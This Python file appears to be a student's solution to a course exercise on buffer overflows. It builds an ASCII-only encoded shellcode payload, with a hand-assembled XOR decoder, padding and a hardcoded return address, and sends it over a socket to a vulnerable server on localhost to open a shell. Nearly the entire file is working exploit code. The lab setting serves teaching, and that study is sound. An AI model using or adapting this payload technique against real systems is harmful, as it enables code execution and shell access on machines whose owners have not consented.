import functools
import os
import socket
import traceback
import q2
import struct
import sys

from infosec.core import assemble, smoke
from typing import Tuple, Iterable


HOST = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT = 1337


ASCII_MAX = 0x7f


def warn_invalid_ascii(selector=None):
    selector = selector or (lambda x: x)

    def decorator(func):
        @functools.wraps(func)
        def result(*args, **kwargs):
            ret = func(*args, **kwargs)
            if any(c > ASCII_MAX for c in selector(ret)):
                smoke.warning(f'Non ASCII chars in return value from '
                              f'{func.__name__} at '
                              f'{"".join(traceback.format_stack()[:-1])}')
            return ret
        return result
    return decorator


def get_raw_shellcode():
    return q2.get_shellcode()


@warn_invalid_ascii(lambda result: result[0])
def encode(data: bytes) -> Tuple[bytes, Iterable[int]]:
    """Encode the given data to be valid ASCII.

    As we recommended in the exercise, the easiest way would be to XOR
    non-ASCII bytes with 0xff, and have this function return the encoded data
    and the indices that were XOR-ed.

    Tips:
    1. To return multiple values, do `return a, b`

    Args:
        data - The data to encode

    Returns:
        A tuple of [the encoded data, the indices that need decoding]
    """
    # TODO: IMPLEMENT THIS FUNCTION
    #raise NotImplementedError()
    
    result_data = bytearray()
    result_index = []
    
    xor_val = 0xff#the value to xor with
    
    #go through all bytes in data
    for i in range(len(data)): 
        if data[i] < 0x80:#valid ascii, just add
            result_data += bytes([data[i]])
        else:#not valid ascii, xor
            tmp = bytes([data[i]^xor_val])
            result_data += tmp
            result_index.append(i)
    
    result_data = bytes(result_data)
    return (result_data, result_index)
    

@warn_invalid_ascii()
def get_decoder_code(indices: Iterable[int]) -> bytes:
    """This function returns the machine code (bytes) of the decoder code.

    In this question, the "decoder code" should be the code which decodes the
    encoded shellcode so that we can properly execute it. Assume you already
    have the address of the shellcode, and all you need to do here is to do the
    decoding.

    Args:
        indices - The indices of the shellcode that need the decoding (as
        returned from `encode`)

    Returns:
         The decoder coder (assembled, as bytes)
    """
    # TODO: IMPLEMENT THIS FUNCTION
    #raise NotImplementedError() 
    
    deco = bytearray([])
    
    #Note: I know we don't allow to use chatGPT, I used her only to recieve some opcode in
    #   assembly x86 not for anything else.
    
    deco += b'\x6a\x00' #by chatGPT it's the opcode for "push 0x00"
    deco += b'\x5b' #by chatGPT it's the opcode for "pop ebx"
    deco += b'\x4b' #by chatGPT it's the opcode for "dec ebx"
    
    #after all that ebx is equal to -1 or 0xffffffff, meaning bl == 0xff
    
    #In the exercise written "indices may be random", so let's sort :)
    sort_ind = sorted(indices)
    
    for i in sort_ind:
        #by chatGPT it's the opcode for "xor byte ptr [eax + i], bl"
        deco += b'\x30\x58' 
        deco += bytes([i])    
            
    return bytes(deco)

@warn_invalid_ascii()
def get_ascii_shellcode() -> bytes:
    """This function returns the machine code (bytes) of the shellcode.

    In this question, the "shellcode" should be the code which if we put EIP to
    point at, it will open the shell. Since we need this shellcode to be
    entirely valid ASCII, the "shellcode" is made of the following:

    - The instructions needed to find the address of the encoded shellcode
    - The encoded shellcode, which is just the shellcode from q2 after encoding
      it using the `encode()` function we defined above
    - The decoder code needed to extract the encoded shellcode

    As before, this does not include the size of the message sent to the server,
    the return address we override, the nop slide or anything else!

    Tips:
    1. This function is for your convenience, and will not be tested directly.
       Feel free to modify it's parameters as needed.
    2. Use the `assemble` module to translate any additional instructions into
       bytes.

    Returns:
         The bytes of the shellcode.
    """
     
    # TODO: IMPLEMENT THIS FUNCTION
    #raise NotImplementedError()
    
    #it's the bytes of decoder+shellcode + some right padding like in q2 
    ascii_hack = bytearray()
    
    #encode our shellcode, in index 0 there is the bytes of the encoded code, index 1 is the indices 
    enco_shell_and_ind = encode(get_raw_shellcode())
    
    #decode by the indices
    deco = get_decoder_code(enco_shell_and_ind[1])
    
    
    right_padding = 700 #like in q2 need to pad with 700, 500 not work
    eax_founder = len(enco_shell_and_ind[0])+right_padding+4 #like said in exercise, 4 is for return address
    
    ascii_hack += b'\x54' #by chatGPT it's the opcode for "push esp"    
    ascii_hack += b'\x58' #by chatGPT it's the opcode for "pop eax"

    #found out only now there is assemble_data...
    sub_instruc = "sub eax, " + str(eax_founder)
    ascii_hack += assemble.assemble_data(sub_instruc) #it's "sub eax, eax_founder" opcode
    
    ascii_hack += deco
    ascii_hack += enco_shell_and_ind[0]
    
    #add right padding like in q2 but can't do nop so do "inc eax" opcode
    for i in range(right_padding):
        ascii_hack += b'\x40'
    
    return bytes(ascii_hack)
   

@warn_invalid_ascii(lambda payload: payload[4:-5])
def get_payload() -> bytes:
    """This function returns the data to send over the socket to the server.

    This includes everything - the 4 bytes for size, the nop slide, the
    shellcode, the return address (and the zero at the end).

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    # TODO: IMPLEMENT THIS FUNCTION
    #raise NotImplementedError()
  
    #esp equal bfffe160, so need to substrackt (1024+16+4)?
    #meaning 0xbfffe160 - 1044 = 0xbfffdd4c?
    #what i see in gdb is 0xbfffdd4a? no my bad, the above calculation is correct
    #the address of the buffer is 0xbfffdd4c
    #for i in range(1024+16):#range(1024) , add 16?
    #        lst += [144] 
   
    #1040 the buffer with the shellcode, 4 bytes return address
    #and one null byte
    size = bytes(struct.pack('>I', 1045))
    
    #get the bytes with the decode, shellcode and the right padding
    asm = get_ascii_shellcode()
    
    #pad it from left, we already have right padding
    res = bytearray(asm.rjust(1040, b'\x40'))#was 1040
    
    #add buffer address in big endian
    res += b'\x4c'
    res += b'\xdd'
    res += b'\xff'
    res += b'\xbf'
    
    #null byte
    res.append(0)
    
    return bytes(size + res)
    
    

def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
